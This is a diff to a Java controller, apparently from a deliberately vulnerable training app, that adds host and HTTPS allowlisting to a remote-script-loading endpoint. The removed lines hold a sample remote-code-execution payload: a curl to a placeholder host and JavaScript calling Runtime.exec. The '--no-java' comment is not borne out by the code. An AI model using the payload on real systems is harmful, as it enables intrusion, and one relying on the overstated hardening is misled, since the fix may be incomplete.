@@ -15,6 +15,8 @@ import javax.script.ScriptEngineManager;
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.sql.DriverManager;
 import java.util.Arrays;
 import java.util.List;
@@ -34,6 +36,11 @@ public class Rce {
     // Allowlist of commands permitted for the ProcessBuilder endpoint
     private static final Set<String> ALLOWED_COMMANDS = Set.of(
             "whoami", "id", "hostname", "date", "uptime", "uname", "df", "free", "ps"
+    );
+
+    // Allowlist of hosts permitted for the JS script loading endpoint
+    private static final Set<String> ALLOWED_SCRIPT_HOSTS = Set.of(
+            "trusted.example.com"
     );
 
     @GetMapping("/runtime/exec")
@@ -102,20 +109,49 @@ public class Rce {
 
 
     /**
-     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
+     * http://localhost:8080/rce/jscmd?jsurl=http://trusted.example.com/zz.js
      *
-     * curl http://xx.yy/zz.js
-     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
-     *
-     * @param jsurl js url
+     * @param jsurl js url (must be HTTPS from an allowlisted host)
      */
     @GetMapping("/jscmd")
-    public void jsEngine(String jsurl) throws Exception{
-        // js nashorn javascript ecmascript
+    public String jsEngine(String jsurl) throws Exception {
+        // Validate the URL: require HTTPS and an allowlisted host
+        URL parsedUrl;
+        try {
+            parsedUrl = new URL(jsurl);
+        } catch (MalformedURLException e) {
+            return "Invalid URL";
+        }
+
+        if (!"https".equalsIgnoreCase(parsedUrl.getProtocol())) {
+            return "Only HTTPS URLs are permitted";
+        }
+
+        if (!ALLOWED_SCRIPT_HOSTS.contains(parsedUrl.getHost().toLowerCase())) {
+            return "Host not in allowlist. Permitted hosts: " + ALLOWED_SCRIPT_HOSTS;
+        }
+
+        // Reject path traversal and fragments that could alter semantics
+        String path = parsedUrl.getPath();
+        if (path.contains("..") || path.contains("\\")) {
+            return "Invalid URL path";
+        }
+
+        // Create engine with Java class access disabled (--no-java)
         ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
         Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
-        String cmd = String.format("load(\"%s\")", jsurl);
+        bindings.remove("Java");
+        bindings.remove("Packages");
+        bindings.remove("java");
+        bindings.remove("javax");
+        bindings.remove("javafx");
+        bindings.remove("com");
+        bindings.remove("org");
+        bindings.remove("edu");
+
+        String cmd = String.format("load(\"%s\")", parsedUrl.toExternalForm());
         engine.eval(cmd, bindings);
+        return "Script executed successfully";
     }
 
 
